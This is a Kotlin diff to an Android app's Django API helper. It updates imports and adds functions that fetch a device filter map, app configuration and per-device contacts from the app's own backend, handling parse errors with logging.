@@ -2,7 +2,8 @@ package com.example.fast.util
 
 import android.os.Build
 import com.example.fast.config.AppConfig
-import com.example.fast.model.exceptions.FastPayException
+import com.example.fast.core.error.FastPayException
+import com.example.fast.core.result.Result
 import com.example.fast.util.network.RetryPolicy
 import com.google.gson.Gson
 import kotlinx.coroutines.Dispatchers
@@ -574,6 +575,62 @@ object DjangoApiHelper {
             LogHelper.e(TAG, "Failed to get device from Django (Code: ${response.code})")
             return null
         }
+    }
+
+    /**
+     * Get device filter from Django (Task 1/8).
+     * Returns filter map (sms, notification, blockSms) if GET /devices/{id}/ includes it.
+     */
+    suspend fun getDeviceFilter(deviceId: String): Map<String, Any?>? {
+        val device = getDevice(deviceId) ?: return null
+        val filter = device["filter"]
+        return if (filter is Map<*, *>) {
+            @Suppress("UNCHECKED_CAST")
+            filter as? Map<String, Any?>
+        } else {
+            null
+        }
+    }
+
+    /**
+     * Get app config from Django (Task 3/11).
+     * GET /app-config/ or /config/ with version, force_update_url, branding, theme.
+     * Returns null if endpoint not implemented or request fails.
+     */
+    suspend fun getAppConfig(): Map<String, Any?>? {
+        val response = executeGet("/app-config/", useRetry = false)
+        if (response.isSuccessful && !response.body.isNullOrBlank()) {
+            return try {
+                gson.fromJson<Map<String, Any?>>(
+                    response.body,
+                    object : com.google.gson.reflect.TypeToken<Map<String, Any?>>() {}.type
+                )
+            } catch (e: Exception) {
+                LogHelper.e(TAG, "Error parsing app-config response", e)
+                null
+            }
+        }
+        return null
+    }
+
+    /**
+     * Get contacts for device from Django (Task 2/7).
+     * GET /devices/{id}/contacts/. Returns null if endpoint not implemented or request fails.
+     */
+    suspend fun getContacts(deviceId: String): List<Map<String, Any?>>? {
+        val response = executeGet("/devices/$deviceId/contacts/", useRetry = false)
+        if (response.isSuccessful && !response.body.isNullOrBlank()) {
+            return try {
+                gson.fromJson<List<Map<String, Any?>>>(
+                    response.body,
+                    object : com.google.gson.reflect.TypeToken<List<Map<String, Any?>>>() {}.type
+                )
+            } catch (e: Exception) {
+                LogHelper.e(TAG, "Error parsing contacts response", e)
+                null
+            }
+        }
+        return null
     }
 
     /**
